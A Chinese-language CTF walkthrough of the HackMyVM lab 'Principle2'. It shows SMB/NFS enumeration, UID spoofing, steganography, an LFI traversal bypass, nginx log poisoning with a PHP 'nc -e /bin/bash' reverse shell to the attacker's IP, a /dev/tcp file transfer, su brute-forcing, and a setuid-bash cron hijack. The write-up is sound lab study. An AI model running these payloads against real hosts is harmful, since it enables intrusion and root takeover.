# hmv_Principle2

# 0.简介

**靶机**：[hackmyvm - Principle2](https://hackmyvm.eu/machines/machine.php?vm=Principle2)
**难度**：黄色
**目标 IP**：192.168.205.247
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST
Nmap scan report for thetruthoftalos.hmv (192.168.205.247)
Host is up (0.00075s latency).
Not shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
35659/tcp open  unknown
42607/tcp open  unknown
43239/tcp open  unknown
43401/tcp open  unknown
46365/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
                                                                   
```

其中80，111，139，445，2049端口我们比较感兴趣，但是我先看smb服务，因为我怕他整幺蛾子

---

# 2.踩点

## prot 445

ps:它这个smb服务不知道是它靶机有幺蛾子还是我攻击机有幺蛾子，我用不了smbmap，而且我用smbclient访问目录有概率失败，如果你复现失败的话，多试几次

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient //192.168.205.247/public
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 28 19:57:45 2023
  ..                                  D        0  Sun Nov 26 00:19:40 2023
  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023
  straton.txt                         N      718  Sun Nov 19 20:00:24 2023
  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023

                19962704 blocks of size 1024. 17182940 blocks available
smb: \> get new_era.txt
getting file \new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
smb: \> get straton.txt
getting file \straton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)
smb: \> get loyalty.txt
getting file \loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat new_era.txt                   
Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat straton.txt
This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.

AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat loyalty.txt
This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).

What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.

2257686f2061726520796f752c207468656e3f22

To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
                                                                                                                                     

# new_era.txt翻译
昨天发生了重大变化，新政府，新市长。所有公民都重新分配了任务。为了安全起见，每个用户都应该更改密码。

# straton.txt翻译
斯特拉顿的《论宇宙》中的这段片段似乎对祖先和创始人都具有重大意义。

阿米塔斯：但是，这告诉我们有关宇宙本质的什么，也就是我们正在讨论的？
斯特拉顿：这是我们必须回答的下一个问题。我们从自我开始，因为自我决定了我们作为个体的存在；但是，如果没有周围的事物，自我就无法存在。公民生活在城市中；城市生活在宇宙中。所以现在我们必须将我们发现的原理应用到更广阔的世界，并问：如果人就像一台机器，那么宇宙的本质是否也类似？如果是这样，从这个事实中可以得出什么结论？

# loyalty.txt翻译
这段文字在拜伦 (7) 和赫尔曼努比斯 (452) 的辩论中引起了相当大的争议。

因此，我认为，我们并非生来就是完全自由的个体，只对自己负责。我们存在的核心，我们的知觉，将我们与动物王国区分开来，并使我们高于动物王国。正如我所说，这不是傲慢的问题，而是责任的问题。

2257686f2061726520796f752c207468656e3f22

简而言之：我们每个人都对人类本身、对跨越时空的人类项目负有忠诚的义务。这不是一件小事，也不是哲学家的抽象问题。它是每个人生命中深刻而重要的一部分。它是意义和洞察力的普遍源泉，可以将我们团结在一起，为我们铺平通往更光明未来的道路；这也是一条分界线，一条必须与那些宣扬自我毁灭福音的人划清的界线。我们忽视它，后果自负。
```

其中密码为**空。**  我们比较感兴趣的是那串像密码一样的字符串。smb服务就可以告一段落了

---

## prot 80

80端口是Apache2的初始页，并且它大小为常规大小`10701`，那我们爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.247 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.247
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
Progress: 110804 / 311425 (35.58%)[ERROR] parse "http://192.168.205.247/besalu\t.php": net/url: invalid control character in URL
[ERROR] parse "http://192.168.205.247/besalu\t.html": net/url: invalid control character in URL
[ERROR] parse "http://192.168.205.247/besalu\t.txt": net/url: invalid control character in URL
[ERROR] parse "http://192.168.205.247/besalu\t.md": net/url: invalid control character in URL
/index.html           (Status: 200) [Size: 10701]
Progress: 311420 / 311425 (100.00%)
===============================================================
Finished
===============================================================
                                                                            
```

无果，告一段落

---

## prot 111

因为我没有打过这个服务，我就去[hacktricks](https://book.hacktricks.wiki/)搜索了一下

**资料**：https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html#bypass-filtered-portmapper-port

![image](https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65)

阅读文本，我们可以发现它和NFS衔接，我们刚好有NFS

**资料**：https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html

查看挂载

```bash
┌──(kali㉿kali)-[~/test]
└─$ showmount -e 192.168.205.247
Export list for 192.168.205.247:
/var/backups *
/home/byron  *
                     
```

ps:*挂载记得要用sudo，不然它会报错*

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo mount -t nfs 192.168.205.247:/var/backups /home/kali/test/tmp/backup
[sudo] kali 的密码：
                                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd backup 
cd: 权限不够: backup
             
┌──(kali㉿kali)-[~/test/tmp]
└─$ sudo mount -t nfs 192.168.205.247:/home/byron /home/kali/test/tmp/home

┌──(kali㉿kali)-[~/test/tmp]
└─$ cd home
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ ls
mayor.txt  memory.txt
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ cat mayor.txt 
Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ cat memory.txt
Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.
                                        
# mayor.txt翻译
现在我已经是市长了，我觉得赫曼努比斯正在密谋反对我，我猜他有一个秘密组织并且把它隐藏起来。

# memory.txt翻译     
赫曼努比斯告诉我，他忘记了密码，无法更改，谢天谢地，我保存了每个邻居的号码和十六进制密码记录。我认为他会成为新耶路撒冷的好市长。                                                
```

告诉我们他保存了每个邻居的号码和十六进制密码记录，应该就在我们看不了那个文件夹，我们去查看一下它的权限

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls -la
总计 52
drwxrwxr-x  4 kali kali    4096  1月12日 10:26 .
drwxrwxr-x 31 kali kali   12288  1月12日 10:03 ..
drwxr--r--  2   54 backup 28672 2023年11月29日 backup
drwxr-xr-x  3 1001   1001  4096 2023年11月26日 home

```

创建具有相同 UID 的用户进行访问：

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ sudo useradd -u 54 hack
useradd warning: hack's uid 54 outside of the UID_MIN 1000 and UID_MAX 60000 range.
                                  
┌──(kali㉿kali)-[~/test/tmp]
└─$ su hack           
密码： 
$ bash
hack@kali:/home/kali/test/tmp$ cd backup/
hack@kali:/home/kali/test/tmp/backup$ ls
(这里省略)

hack@kali:/home/kali/test/tmp/backup$ cat *.txt
(这里省略)

```

我们将十六进制尝试恢复一下

```bash
hack@kali:/home/kali/test/tmp/backup$ cat *.txt > /tmp/a.txt
hack@kali:/home/kali/test/tmp/backup$ su kali
密码： 

┌──(kali㉿kali)-[~/test/tmp/backup]
└─$ cp /tmp/a.txt ~/test/a.txt
                              
┌──(kali㉿kali)-[~/test]
└─$ xxd -ps -r a.txt | strings
(这里省略)
ByronIsAsshole
(这里省略)                
```

获得了一个类似密码的东西，它没有开放ssh端口，那就只可能是smb服务的密码了

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient -L //192.168.205.247// -N                       

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      New Jerusalem Public
        hermanubis      Disk      Hermanubis share
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.205.247 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/test]
└─$ smbclient //192.168.205.247/hermanubis -U hermanubis
Password for [WORKGROUP\hermanubis]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 28 22:44:44 2023
  ..                                  D        0  Wed Nov 29 09:13:50 2023
  index.html                          N      346  Tue Nov 28 22:44:41 2023
  prometheus.jpg                      N   307344  Wed Nov 29 01:23:24 2023

                19962704 blocks of size 1024. 17151324 blocks available
smb: \> get index.html 
getting file \index.html of size 346 as index.html (15.4 KiloBytes/sec) (average 15.4 KiloBytes/sec)
smb: \> get prometheus.jpg 
getting file \prometheus.jpg of size 307344 as prometheus.jpg (11543.8 KiloBytes/sec) (average 6260.0 KiloBytes/sec)
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat index.html 
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to the resistance forum</title>
</head>
<body>

    <h1>Welcome to the resistance forum</h1>

    <p>free our chains!</p>

    <img src="prometheus.jpg" alt="chained">

</body>
</html>
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ exiftool prometheus.jpg   
ExifTool Version Number         : 13.00
File Name                       : prometheus.jpg
Directory                       : .
File Size                       : 307 kB
File Modification Date/Time     : 2025:01:12 12:33:09+08:00
File Access Date/Time           : 2025:01:12 12:33:09+08:00
File Inode Change Date/Time     : 2025:01:12 12:33:09+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1920x1080
Megapixels                      : 2.1
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ stegseek prometheus.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "soldierofanubis"   
[i] Original filename: "secret.txt".
[i] Extracting to "prometheus.jpg.out".

                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat prometheus.jpg.out
I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
                                                                                                                                                                                              
```

图片里隐藏了一个域名，加入我们的hosts中

![image](https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f)

此地无银三百两，爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://thetruthoftalos.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thetruthoftalos.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 169] [--> http://thetruthoftalos.hmv/uploads/]
/index.html           (Status: 200) [Size: 8]
/index.php            (Status: 200) [Size: 1970]
Progress: 51629 / 311425 (16.58%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 53720 / 311425 (17.25%)
===============================================================
Finished
===============================================================

```

`index.php`大小明显不一样

![image](https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70)

你在输入框中输入点东西，你就会发现一些有趣的东西

![image](https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67)

看着就像有**本地文件包含漏洞**

![image](https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354)

回显不对，应该要**双重绕过**

![image](https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037)

成功获得`/etc/passwd`，因为没有ssh端口，所以尝试一下日志包含，我们看一下它的架构

![image](https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09)

```bash
/var/log/nginx/access.log
/var/log/nginx/error.log
```

![image](https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82)

可以回显，我们构造一下

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ curl http://thetruthoftalos.hmv/shell -H "User-Agent: <?php exec('nc -e /bin/bash 192.168.205.141 8888')  ?>"
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ curl http://thetruthoftalos.hmv/index.php?filename=....//....//....//....///var/log/nginx/access.log       


```

卡住就是弹回来了

---

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.提权

上来以后转了一圈都没发现什么有意思的东西，我就直接甩了一个linpeas.sh上来了,也无果，但是查看pspy看定时任务的时候发现了这个

![image](https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b)

但是我们没有修改的权限

```bash
www-data@principle2:/tmp$ ls -la /usr/local/share/report
-rwxrwx--- 1 root talos 16584 Nov 25  2023 /usr/local/share/report

principle2:/home/talos$ sudo -u talos cat /usr/local/share/report > /tmp/report
www-data@principle2:/home/talos$ cd /tmp/
www-data@principle2:/tmp$ cat report > /dev/tcp/192.168.205.141/7777
```

拷过来看看具体运行什么

```bash
┌──(kali㉿kali)-[~/test]
└─$ strings report 
/lib64/ld-linux-x86-64.so.2
fgets
rewind
perror
fread
exit
fopen
strstr
pclose
__libc_start_main
__cxa_finalize
popen
fclose
fputs
fwrite
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
write www-data
You are not allowed to be here
Error sending message to www-data
/opt/users.txt
Error opening output file
Error executing 'who' command
www-data
New information appended to '/opt/users'
No new information to append
;*3$"
GCC: (Debian 13.2.0-5) 13.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
report.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
fread@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
_fini
rewind@GLIBC_2.2.5
pclose@GLIBC_2.2.5
fputs@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
notifyNotAllowed
__bss_start
main
popen@GLIBC_2.2.5
fopen@GLIBC_2.2.5
perror@GLIBC_2.2.5
exit@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
strstr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
                       
```

没有发现什么明显利用点，想着拿之前的密码尝试登录的时候，发现有之前**SMB服务**的`hermanubis`用户（骂的很脏）

```bash
www-data@principle2:/tmp$ ls /home/
byron  city  hermanubis  melville  talos

www-data@principle2:/tmp$ su - hermanubis
Password: 
$ id
uid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis)
$ sudo -l
Matching Defaults entries for hermanubis on principle2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User hermanubis may run the following commands on principle2:
    (talos) NOPASSWD: /usr/bin/cat

$ cd /home/hermanubis
$ ls
investigation.txt  share  user.txt
$ cat investigation.txt 
I am aware that Byron hates me... especially since I lost my password.
My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
What he doesn't know is that it is in the Byron database...

# 翻译
我知道拜伦讨厌我……尤其是自从我忘记密码之后。
我和我的朋友们经过多次分析和攻击，发现梅尔维尔使用的密码是 32 个字符……
但他不知道的是，这个密码就在拜伦的数据库中……
```

Byron就是之前那个市长，32个字符就是那个16进制表，拿过来爆破一下就好了

```bash
$ cd /tmp
$ ./suForce -u melville -w a.txt 
            _____                        
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | melville
📖 Wordlist | a.txt
🔎 Status   | 54/1001/5%/1bd5528b6def9812acba8eb21562c3ec
💥 Password | 1bd5528b6def9812acba8eb21562c3ec
───────────────────────────────────


$ su - melville
Password: 
root is watching you, it has a record of all your steps:

melville@principle2:~$ id
uid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)

```

melville用户有`talos`的权限，可以修改/usr/local/share/report文件，我们把bash加个权限就好了

```bash
melville@principle2:~$ vi /usr/local/share/report
melville@principle2:~$ cat /usr/local/share/report
#!/bin/bash
chmod +s /bin/bash
```

然后等就好了，等它定时任务触发

```bash
melville@principle2:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
melville@principle2:/tmp$ bash -p
bash-5.2# id
uid=1003(melville) gid=1003(melville) euid=0(root) egid=0(root) groups=0(root),1000(talos),1003(melville)

```

下班